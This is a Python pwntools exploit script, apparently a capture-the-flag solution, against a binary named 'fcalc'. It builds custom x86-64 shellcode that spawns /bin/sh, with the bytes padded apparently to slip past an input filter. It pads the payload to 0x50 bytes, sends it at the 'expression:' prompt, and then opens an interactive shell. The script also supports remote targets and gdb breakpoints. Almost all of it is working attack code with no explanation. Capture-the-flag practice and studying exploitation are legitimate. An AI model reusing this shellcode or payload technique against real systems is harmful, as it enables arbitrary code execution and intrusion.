from pwn import *
import sys
remote_addr = ["",]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./fcalc")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x1867)
    b *$rebase(0x198b)
''')

shellcode = b'\x6a\x68\x90\x90\x90\x90\x40\x40' #push 0x68
shellcode += b'\x90\x90\x48\xb8\x2f\x62\x40\x40' #mov rax, 0x732f2f2f6e69622f
shellcode += b'\x2f\x2f\x2f\x73\x90\x90\x40\x40'
shellcode += b'\x90\xbb\x00\x00\x29\x2e\x40\x40'
shellcode += b'\x90\x90\x90\x48\x01\xd8\x40\x40' #add rax-rbx
shellcode += b'\x50\x48\x89\xe7\x90\x90\x40\x40'
shellcode += b'\x68\x73\x68\x00\x00\x90\x40\x40'
shellcode += b'\x48\x31\xf6\x56\x6a\x08\x40\x40'
shellcode += b'\x5e\x48\x01\xe6\x56\x90\x40\x40'
shellcode += b'\x48\x89\xe6\x31\xd2\x90\x40\x40'
shellcode += b'\x6a\x3b\x58\x0f\x05\x90\x40\x40'

payload = b'100 100 0'.ljust(0x50, b'\x00')
payload += shellcode
sa(b'expression:', payload)

shell()
